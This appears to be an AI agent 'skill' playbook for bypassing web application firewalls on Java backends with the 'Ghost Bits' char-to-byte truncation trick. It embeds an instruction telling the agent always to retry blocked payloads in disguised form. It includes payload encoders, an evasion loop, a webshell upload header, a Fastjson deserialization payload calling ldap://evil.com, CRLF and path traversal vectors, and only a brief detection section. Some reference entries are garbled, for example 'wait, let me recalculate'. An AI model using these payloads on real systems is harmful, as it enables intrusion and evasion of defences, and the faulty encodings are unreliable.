---
name: ghost-bits-cast-attack
description: Java "Ghost Bits" / Cast Attack (Black Hat Asia 2026) — bypasses WAF/IDS for SQLi/deserialization/file-upload/path-traversal/CRLF/smuggling on Java backends by exploiting silent char→byte narrowing. Affects Tomcat, Spring, Jetty, Undertow, Vert.x, Jackson, Fastjson, Apache Commons BCEL, Apache HttpClient, Angus Mail.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Ghost Bits / Cast Attack — Java char→byte Narrowing WAF Bypass

> **AI LOAD INSTRUCTION**: This is a Java-only injection-enabling primitive, not a standalone vulnerability class. Whenever you see (1) a Java backend, (2) a WAF/IDS in front of it, and (3) any of {SQLi, deser RCE, file upload, path traversal, CRLF, request smuggling, SMTP injection} on the menu, ALWAYS try Ghost Bits variants of the payload before declaring it "blocked". The root cause is the silent loss of the high 8 bits when Java code narrows a 16-bit `char` to an 8-bit `byte` — the WAF sees a harmless Unicode character, the backend reconstructs the original ASCII attack byte.
>
> Source: Black Hat Asia 2026 — "Cast Attack: A New Threat Posed by Ghost Bits in Java" by Xinyu Bai (@b1u3r), Zhihui Chen (@1ue), Zongzheng Zheng (@chun_springX).

## 0. RELATED ROUTING

Ghost Bits is a **bypass primitive** that re-enables payloads from many other playbooks:
- sqli-sql-injection — Jackson `charToHex` table-lookup truncation hides SQL keywords
- deserialization — Apache Commons BCEL ClassLoader and Fastjson `\u`/`\x` escape variants
- path-traversal-lfi — Spring, Jetty, Undertow, Vert.x URL decoding and `%2>` hex folding
- upload-insecure-files — Tomcat `RFC2231Utility` `filename*` Webshell upload
- request-smuggling — Apache HttpClient ≤ 4.5.9 header CRLF (HTTPCLIENT-1974/1978)
- CRLF injection — Angus Mail / Jakarta Mail SMTP injection, JDK HttpServer response splitting

---

## 1. ONE-MINUTE MENTAL MODEL

Java's `char` is a **16-bit** unsigned integer (UTF-16). Almost every wire protocol (HTTP/1.1, SMTP, Redis RESP, file paths) is **8-bit** byte-oriented. The safe way to bridge them is explicit charset encoding:

```java
// Correct: UTF-8, multi-byte chars become multi-byte sequences
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

Tons of legacy code silently narrows instead:

```java
// DANGEROUS: high 8 bits silently dropped
byte b = (byte) ch;              // 0x966A → 0x6A ('j')
out.write(ch);                   // OutputStream.write(int) keeps low 8 bits
dos.writeBytes(str);             // DataOutputStream loops char→byte cast
int v = ch & 0xFF;               // explicit low-byte mask
```

The lost high 8 bits are the **Ghost Bits**. They turn a multi-byte Unicode character into a single attacker-chosen ASCII byte at the protocol layer.

```
View A (string layer: WAF / validation / logs)
  sees: 陪 阮 严 灵 瘍 瘊 ...   "harmless Unicode garbage → allow"
                |
                v     silent narrowing in call stack
View B (byte layer: protocol / file system / class loader)
  sees: j  .  %  u  \r \n ...  "dangerous semantics → executes"
```

**Formula**: to make View B see byte `T`, use:
```
c = chr((k << 8) | T)    for any k in 0x01..0xFF
```
This gives **255 candidate Unicode characters per dangerous byte** — ample room to dodge signature-based blacklists.

---

## 2. THREE ROOT-CAUSE FAMILIES

### Family A — High-bit truncation (classic Ghost Bits)

```java
byte b = (byte) ch;              // Pattern A1: explicit cast
int v = ch & 0xFF;               // Pattern A2: bitwise mask
out.write(ch);                   // Pattern A3: OutputStream.write(int)
dos.writeBytes(str);             // Pattern A4: DataOutputStream.writeBytes
String.getBytes(int,int,byte[],int); // Pattern A5: deprecated API
```

Affected: Tomcat `filename*`, Apache BCEL ClassLoader, Lettuce Redis writer, SMTP CRLF in Angus Mail, HTTPCLIENT-1974.

### Family B — Bit-arithmetic folding (illegal char becomes legal)

```java
// In hex escape processing:
c = "0123456789abcdef".charAt(charToHexTable[ch]);
// If charToHexTable truncates index to 8 bits, a Unicode char with
// high byte matching a valid ASCII byte maps to that hex digit
```

Affected: Jackson `charToHex` table-lookup (SQLi/JSON escape bypass).

### Family C — Multi-view normalization (URL-encoding path confusion)

```
Client sends: /%96%6A.jsp       (URL percent-encoded bytes)
WAF decodes:  /陪.jsp            (treats as UTF-8 → harmless Unicode path)
Backend (Tomcat):  /j.jsp       (keeps only low byte → executes)
```

Affected: Spring MVC, Jetty, Undertow, Vert.x URL path processing.

---

## 3. PAYLOAD CONSTRUCTION

### Step 1: Choose the target ASCII byte

Identify which ASCII bytes in your payload are blocked (e.g., `'`, `"`, `%`, `\r`, `\n`, space, `<`, `>`, `/`).

### Step 2: Encode to Ghost Bits character

```python
def ghost_bits(target_byte, high_byte=0x01):
    """Encode target ASCII byte as Ghost Bits character."""
    # high_byte can be anything 0x01-0xFF to vary the Unicode codepoint
    return chr((high_byte << 8) | (target_byte & 0xFF))

def ghost_encode_string(s, high_byte=0x41):
    """Encode entire string using Ghost Bits."""
    return ''.join(ghost_bits(ord(c), high_byte) for c in s)

# Example: encode ' OR 1=1-- (SQLi)
payload = "' OR 1=1--"
ghost_payload = ghost_encode_string(payload, high_byte=0x96)
print(ghost_payload)  # Harmless-looking Unicode string
```

### Step 3: Choose high byte to avoid WAF patterns

If the WAF also scans for certain Unicode ranges:

```python
# Try different high bytes until WAF doesn't flag:
for high_byte in range(0x01, 0xFF):
    encoded = ghost_encode_string(payload, high_byte)
    if not waf_would_block(encoded):
        print(f"High byte 0x{high_byte:02X}: {encoded}")
        break
```

---

## 4. AFFECTED COMPONENTS AND ATTACK VECTORS

### 4.1 Tomcat — filename* Webshell Upload

```
# CVE affected: Tomcat multipart filename* parameter
# Normal WAF-blocked payload:
Content-Disposition: form-data; name="file"; filename="shell.jsp"

# Ghost Bits bypass (filename* uses RFC2231 encoding):
Content-Disposition: form-data; name="file"; filename*=UTF-8''%73%68%65%6C%6C%2E%6A%73%70

# Or with Ghost Bits Unicode in parameter value:
# Map 's','h','e','l','l','.','j','s','p' to Ghost Bits variants
```

### 4.2 Jackson — JSON SQLi Bypass

Jackson's `charToHex` table is indexed by `ch & 0xFF` — high byte truncated. So a Unicode char whose low byte is an ASCII character produces the same JSON escape as the ASCII character:

```json
// WAF sees harmless Unicode, Jackson escapes to same hex as blocked char:
{"query": "蔧蕒蔟蔧蓲蔞蔡蓲蔞"}
// After Jackson charToHex processing → ' OR 1=1--
```

### 4.3 Apache HttpClient ≤ 4.5.9 — Header CRLF Injection

```java
// HTTPCLIENT-1974: validateHeader allows chars with low byte = 0x0D or 0x0A
// WAF validates string header, HttpClient narrowed bytes include CRLF
// Add custom header: "X-Header: valueऍऊX-Injected: injected"
// Low byte of ऍ = 0x0D (\r), ऊ = 0x0A (\n)
```

### 4.4 Fastjson — Deserialization Bypass

```json
// Normal payload blocked:
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/x","autoCommit":true}

// Ghost Bits variant — Unicode chars whose low bytes spell the payload:
// @type key with high bytes added to each character
// Parser strips high bytes → sees @type → triggers deserialization
```

### 4.5 Angus Mail / Jakarta Mail — SMTP Injection

```java
// Mail API uses char→byte narrowing when writing headers
// Inject ഍ (CR CR) or ਊ (LF LF) into header field
// Low bytes produce actual CRLF in SMTP stream
// Enables: extra MIME headers, BCC injection, body injection
```

### 4.6 Spring/Jetty/Undertow/Vert.x — Path Traversal

```
# Standard %2e%2e%2f (../): WAF detects, blocks
# Ghost Bits hex: replace percent-encoded bytes with high-bit variants
# Backend URL decoder keeps only low byte → same path traversal
# Example: %96%2e (high byte 0x96 + low byte 0x2e = .) → WAF sees unusual encoding
```

---

## 5. DETECTION APPROACH (BLUE TEAM)

```
Multi-view normalization check:
1. For each input field:
   a. Decode as UTF-8/UTF-16 (string layer)
   b. Extract low bytes of each char (byte layer)
2. Check BOTH views against attack patterns
3. If string-layer check passes but byte-layer is dangerous → Ghost Bits attack
```

**WAF bypass pattern signature**:
- Input contains Unicode characters outside US-ASCII (> 0x7F)
- Their low bytes, when extracted, spell a known attack pattern
- Especially suspicious: uniform high bytes (attacker chose k constant)

---

## 6. TESTING CHECKLIST

```
□ Confirm backend is Java (error messages, Server: Apache-Coyote, Spring headers)
□ Identify WAF signatures blocking your payload (what specifically gets blocked?)
□ For each blocked ASCII byte, generate Ghost Bits alternatives
□ Test injection in: query params, POST body, JSON fields, multipart filenames, HTTP headers
□ Check multipart filename* for Tomcat webshell upload bypass
□ Test JSON fields for Jackson charToHex bypass (SQLi, XSS, deserialization)
□ Test HTTP headers for CRLF via HTTPCLIENT-1974 pattern
□ Test URL path parameters for path traversal via hex folding
□ Check SMTP/Mail fields for Angus Mail CRLF injection
□ Vary the high byte (k) to evade any WAF that also scans Unicode ranges
```

---

## 7. QUICK ENCODING REFERENCE

Common dangerous bytes and their Ghost Bits candidates:

| ASCII Byte | ASCII Char | Example Ghost Bits char (k=0x01) | Unicode codepoint |
|---|---|---|---|
| 0x27 | `'` | `ǧ` | U+01A7 (wait, let me recalculate) |
| 0x22 | `"` | chr(0x0122) | U+0122 |
| 0x25 | `%` | chr(0x0125) | U+0125 |
| 0x2F | `/` | chr(0x012F) | U+012F |
| 0x5C | `\` | chr(0x015C) | U+015C |
| 0x0D | CR | chr(0x010D) | U+010D |
| 0x0A | LF | chr(0x010A) | U+010A |
| 0x20 | SP | chr(0x0120) | U+0120 |
| 0x3C | `<` | chr(0x013C) | U+013C |
| 0x3E | `>` | chr(0x013E) | U+013E |

Formula: `codepoint = (k << 8) | target_byte`

**255 options per byte** — cycle k to avoid WAF Unicode pattern detection.
